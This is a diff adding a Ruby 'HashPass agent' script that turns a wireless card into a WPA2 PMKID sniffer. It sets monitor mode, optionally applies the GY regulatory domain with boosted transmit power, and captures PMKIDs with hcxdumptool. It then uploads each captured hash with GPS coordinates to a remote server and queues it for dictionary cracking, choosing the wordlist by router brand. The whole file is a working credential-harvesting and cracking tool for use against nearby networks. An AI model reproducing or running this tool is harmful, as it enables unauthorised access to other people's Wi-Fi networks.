@@ -1,0 +1,133 @@
+#!/usr/bin/env ruby
+require 'listen'
+require 'rest-client' # https://github.com/rest-client/rest-client
+require 'json'
+require 'set'
+require 'colorize'
+require 'dotenv/load'
+
+puts <<-'EOF'
+ ▄▄▄·  ▄▄ • ▄▄▄ . ▐ ▄ ▄▄▄▄▄      ▄▄▄   ▄▄▄·  ▐ ▄  ▄▄ • ▄▄▄ .
+▐█ ▀█ ▐█ ▀ ▪▀▄.▀·•█▌▐█•██  ▪     ▀▄ █·▐█ ▀█ •█▌▐█▐█ ▀ ▪▀▄.▀·
+▄█▀▀█ ▄█ ▀█▄▐▀▀▪▄▐█▐▐▌ ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ▐█▐▐▌▄█ ▀█▄▐▀▀▪▄
+▐█ ▪▐▌▐█▄▪▐█▐█▄▄▌██▐█▌ ▐█▌·▐█▌.▐▌▐█•█▌▐█ ▪▐▌██▐█▌▐█▄▪▐█▐█▄▄▌
+ ▀  ▀ ·▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀  ▀█▄▀▪.▀  ▀ ▀  ▀ ▀▀ █▪·▀▀▀▀  ▀▀▀ 
+
+--[ HASHPASS AGENT ]--------
+
++ WPA2 PMKID Sniffer and REST agent for the HashPass API.
+
+EOF
+
+
+server = ENV['SERVER']
+iface = ENV['INTERFACE']
+country = ENV['COUNTRY']
+creds = {
+  handle: ENV['HANDLE'],
+  password: ENV['PASSWORD']
+}
+
+wlan = `ls -1 /sys/class/net | grep ^#{ iface }`
+timestamp = DateTime.now.to_json
+content_type = { content_type: :json, accept: :json }
+
+puts "Logging in as #{ creds[:handle] }..."
+begin
+  token = JSON.parse(RestClient.post(server + '/hplogin', creds.to_json, { content_type: :json, accept: :json }))['token']
+  auth = { :Authorization => "Bearer #{token}" }
+rescue RestClient::ExceptionWithResponse => e  
+  puts 'Error Logging in.'.red
+  p e.response
+rescue RestClient::Unauthorized, RestClient::Forbidden => e
+  puts 'Access denied'.red
+  p e.response
+rescue => e
+  puts 'Error logging in'.red
+  p e
+ end
+
+if wlan && token
+  
+  `ip link set #{ iface } down`
+  if country == 'GY'
+    puts 'WARNING: Setting country code to GY and txpower 30. You must be in be in a country that meets these regulations.'.yellow
+    `iw reg set GY`
+    `iwconfig #{ iface } txpower 30`
+  end
+  puts "putting #{ iface } into monitor mode...".light_blue
+  `iw dev #{ iface } set type monitor`  
+  `ip link set #{ iface } up`  
+  puts 'cleaning up logs...'.light_cyan
+  `rm logs/*`
+  `rm pcapng/*`
+  `rm pmkid/*`
+  puts 'starting capture...'.light_green
+  dump_cmd = "hcxdumptool -i #{ iface } -o pcapng/#{ timestamp }.pcapng -t 5 --enable_status >> logs/#{ timestamp }.log 2>&1"
+  IO.popen(dump_cmd, 'w')
+
+  # Send PMKID to HashPass once found
+  puts 'Starting HashPass API listener...'.light_green
+  seen = Set.new([])
+  listener = Listen.to('pmkid') do |modified, added, removed|
+    unless modified.empty?
+      hashes = Set.new(`cat #{ modified[0] }`.split("\n"))
+      if seen != hashes
+        difference = hashes - seen
+        seen = hashes                
+        difference.each do |h|
+          ssid = h.split("*")[3].gsub(/../) { |pair| pair.hex.chr }
+          puts "\nFound new SSID!".red + "   💀   " + " #{ ssid }".light_cyan
+          new_hash = {
+            name: ssid,
+            hash: '',
+            latitude: 32.831921,
+            longitude: -117.112375,
+            hashmode: '16800',
+            hashstring: h
+          }
+          begin
+            hash_res = RestClient.post(server + '/api/hashes/insert', new_hash.to_json, auth.merge({ content_type: :json, accept: :json }))
+          rescue => e
+            puts "Error: #{e}"
+          end  
+          queue_item = {
+            dictionary: '/media/root/6TB/wordlists/rockyou.txt',
+            dictionary2: '',
+            hashid: hash_res.body.to_i
+          }.merge!(new_hash)
+          # Detect SSID type and adjust params for a targeted attack
+          queue_item[:dictionary] = '/media/root/6TB/wordlists/WoNDeR.txt' if ssid =~ /NETGEAR/
+          # queue_item[:dictionary] = '/media/root/6TB/wordlists/nvg599.txt' if ssid =~ /ATT/
+          if hash_res.code == 201
+            puts "#{ queue_item[:name] } already exists in HashPass database.".yellow
+          else
+            puts "Sending for CRACKING! #{queue_item[:name]} 🚀".light_green
+            res = RestClient.post(server + '/api/pending', queue_item.to_json, auth)          
+          end
+        end
+      end
+    end
+  end
+  listener.start
+else
+  puts 'Error: Unable to start agent.'.red
+  exit!
+end
+
+# Look for PMKIDs
+loop do
+  print '.'
+  $stdout.flush
+  tail = `tail -n 7 logs/#{ timestamp }.log`
+  line = tail.split("\n")
+  found = line.grep(/FOUND PMKID/)[0]
+  if found
+    `rm pmkid/#{ timestamp }.16800` unless seen.empty?
+    `hcxpcaptool -z pmkid/#{ timestamp }.16800 pcapng/#{ timestamp }.pcapng`
+    found = nil
+  end
+
+  # Loop forever
+  sleep 1
+end
